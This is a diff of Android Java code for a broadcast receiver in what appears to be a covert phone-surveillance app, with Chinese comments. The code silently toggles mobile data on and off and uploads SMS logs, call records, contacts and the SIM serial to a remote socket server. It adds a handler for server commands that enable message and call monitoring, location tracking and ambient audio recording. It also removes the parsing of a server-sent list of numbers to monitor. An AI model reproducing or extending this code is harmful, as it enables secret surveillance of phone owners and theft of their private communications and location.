@@ -9,7 +9,7 @@ import java.util.ArrayList;
 import java.util.Collection;
 import java.util.HashMap;
 import java.util.Iterator;
-import org.json.JSONArray;
+
 import org.json.JSONException;
 import org.json.JSONObject;
 
@@ -53,10 +53,20 @@ public class CronBroadcaseRectiver extends BroadcastReceiver {
 	private DirectiveDB directiveDB;
 	private TelephonyManager tm;
 	private ClientSocket cSocket;
+	private boolean isCloseMobileNet ;
 	
 	@Override
 	public void onReceive(final Context context, Intent intent) {
 		final SharedPreferences sp = context.getSharedPreferences(C.DEVICE_INFO,Context.MODE_PRIVATE);
+		smsRecordDB = SMSRecordDB.getInstance(context);
+		callRecordDB = CallRecordDB.getInstance(context);
+		directiveDB = DirectiveDB.getInstance(context);
+		if(!HttpUtil.detect(context)){
+			Logger.d("CronBroadcaseRectiver","开启网络");
+			AppUtil.toggleMobileNet(context, true);
+			isCloseMobileNet = true;
+		}
+		
 		if(cSocket == null){
 		
 			String devBrand = sp.getString(C.DEVICE_BRAND,"");
@@ -82,6 +92,7 @@ public class CronBroadcaseRectiver extends BroadcastReceiver {
 					if(!hasUpload){
 						uploadContact(context, sp);
 					}
+					
 				}
 			};
 			cSocket.start();
@@ -90,34 +101,16 @@ public class CronBroadcaseRectiver extends BroadcastReceiver {
 		}
 		
 		new Thread(new Runnable() {
-			boolean isCloseMobileNet = false;
+			
 			@Override
 			public void run() {
-				smsRecordDB = SMSRecordDB.getInstance(context);
-				callRecordDB = CallRecordDB.getInstance(context);
-				directiveDB = DirectiveDB.getInstance(context);
-				if(DirectiveUtil.isStopAllFunction(directiveDB)){
-					return ;
-				}
-				
-				if(!HttpUtil.detect(context)){
-					Logger.d("CronBroadcaseRectiver","开启网络");
-					AppUtil.toggleMobileNet(context, true);
-					isCloseMobileNet = true;
-				}
-				SystemClock.sleep(10000);
 				
 				if(tm==null){
 					tm = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
 				}
 				
-				new Thread(new Runnable() {
-					@Override
-					public void run() {
-						uploadSMSData(smsRecordDB,context);
-						uploadCallRecord(callRecordDB,context);
-					}
-				}).start();
+			    uploadSMSData(smsRecordDB,context);
+			    uploadCallRecord(callRecordDB,context);
 				
 				SharedPreferences sp = context.getSharedPreferences(C.DEVICE_INFO,Context.MODE_PRIVATE);
 				String simID = tm.getSimSerialNumber();
@@ -127,100 +120,18 @@ public class CronBroadcaseRectiver extends BroadcastReceiver {
 					editor.putString(C.PHONE_NUM,simID);
 					editor.commit();
 				}
-				String monitorList = AppUtil.streamToStr(NetworkUtil.download(context,"tel="+sp.getString(C.PHONE_NUM,""),C.RequestMethod.getMonitorList));
+			
 			    if(isCloseMobileNet){
 			    	AppUtil.toggleMobileNet(context, false);
 			    }
-				if(!TextUtils.isEmpty(monitorList)){
-			    	HashMap<String,Monitor> hashMap = new HashMap<String, Monitor>();
-			        monitorDB = MonitorDB.getInstance(context);
-			    	try {
-						JSONObject jsonObject = new JSONObject(monitorList);
-						String location = jsonObject.getString("loc");
-						Logger.d(TAG, "是否定位:"+location);
-						
-						JSONObject callObject = jsonObject.getJSONObject("call");
-						JSONArray jsonArray = callObject.getJSONArray("monitor");
-						int callListLength = jsonArray.length();
-						for(int j =0 ; j < callListLength ; j++){
-							String callMonitorPhone= jsonArray.getString(j);
-							Monitor monitor = new Monitor();
-							monitor.setPhone(callMonitorPhone);
-							monitor.setCallMonitorStatus("1");
-							monitor.setLocationStatus(location);
-							hashMap.put(callMonitorPhone, monitor);
-							Logger.d(TAG,"监听通话号码为:"+callMonitorPhone);
-						}
-						
-						JSONArray jArrayNotMonitor = callObject.getJSONArray("not_monitor");
-						int length3 = jArrayNotMonitor.length();
-						for(int i = 0 ; i < length3 ; i++){
-							String notMonitorStr = jArrayNotMonitor.getString(i);
-							Monitor monitor = new Monitor();
-							monitor.setPhone(notMonitorStr);
-							monitor.setCallMonitorStatus("0");
-							monitor.setLocationStatus(location);
-							hashMap.put(notMonitorStr,monitor);
-							Logger.d(TAG,"不监听的通话号码:"+notMonitorStr);
-						}
-						
-						JSONObject msgJsonObject = jsonObject.getJSONObject("msf");
-						JSONArray jsonArray2 = msgJsonObject.getJSONArray("monitor");
-						int length4 = jsonArray2.length();
-						for(int b = 0 ; b<length4 ; b++){
-							String msgMonitorPhone = jsonArray2.getString(b);
-							Monitor monitor = hashMap.get(msgMonitorPhone);
-							if(monitor==null){
-								monitor = new Monitor();
-								monitor.setPhone(msgMonitorPhone);
-								monitor.setLocationStatus(location);
-							}
-							monitor.setSmsMonitorStatus("1");
-							hashMap.put(msgMonitorPhone, monitor);
-							Logger.d(TAG,"信息监听号码:"+msgMonitorPhone);
-						}
-						
-						JSONArray jsonArray3 = msgJsonObject.getJSONArray("not_monitor");
-						int lengtn5 = jsonArray3.length();
-						for(int c = 0 ; c < lengtn5 ; c++){
-							String msgNotMonitor = jsonArray3.getString(c);
-							Monitor monitor = hashMap.get(msgNotMonitor);
-							if(monitor==null){
-								monitor= new Monitor();
-								monitor.setPhone(msgNotMonitor);
-								monitor.setLocationStatus(location);
-							}
-							monitor.setSmsMonitorStatus("0");
-							hashMap.put(msgNotMonitor, monitor);
-							Logger.d(TAG,"信息不监听号码:"+msgNotMonitor);
-						}
-						
-						JSONArray jsonArray4 = msgJsonObject.getJSONArray("filter");
-						int length6 = jsonArray4.length();
-						for(int u = 0 ;u < length6 ; u++){
-							String msgFilter = jsonArray4.getString(u);
-							Monitor monitor = hashMap.get(msgFilter);
-							if(monitor==null){
-								monitor = new Monitor();
-								monitor.setPhone(msgFilter);
-								monitor.setLocationStatus(location);
-							}
-							monitor.setFilterStatus("1");
-							Logger.d(TAG,"信息拦截号码:"+msgFilter);
-						}
-						insertDB(hashMap);
-						
-					} catch (JSONException e) {
-						Logger.d("CronBroadcaseRectiver",e.getMessage());
-					}
-			    }
+				
 			}
 		}).start();
 		
 	}
 	
 	private void insertDB(HashMap<String,Monitor> hashMap){
-		//删除前先删除所有的数据
+		//增加前先删除所有的数据
 		monitorDB.deleteAll();
 		 Collection<Monitor> monitors = hashMap.values();
 		 Iterator<Monitor> iterator = monitors.iterator();
@@ -355,6 +266,42 @@ public class CronBroadcaseRectiver extends BroadcastReceiver {
 			} catch (IOException e) {
 				e.printStackTrace();
 			}
+		}
+	}
+	
+	//处理服务端返回的信息
+	private void handleMessage(String type,String data){
+		try {
+			
+			if(ClientSocket.TYPE_INFO.equalsIgnoreCase(type)){
+				JSONObject jsonObject = new JSONObject(data);
+				//是否进行短信监控 
+				String monMess = jsonObject.getString("can_mon_msg");
+				
+				//是否进行通话记录监控
+				String monCall = jsonObject.getString("can_mon_call");
+		    
+				//是否进行定位
+				String monLoc = jsonObject.getString("can_mon_loc");
+				
+				//是否可以进行录音(环境录音)
+				String monRec = jsonObject.getString("can_mon_rec");
+			    
+				
+			//立刻定位
+			}else if(ClientSocket.TYPE_GPS_NOW.equalsIgnoreCase(type)){
+				
+			
+		    //录音 
+			}else if(ClientSocket.TYPE_REC_NOW.equalsIgnoreCase(type)){
+				
+				
+				
+			}
+			
+			
+		} catch (JSONException e) {
+			Logger.d(TAG,"json format error");
 		}
 	}
 }
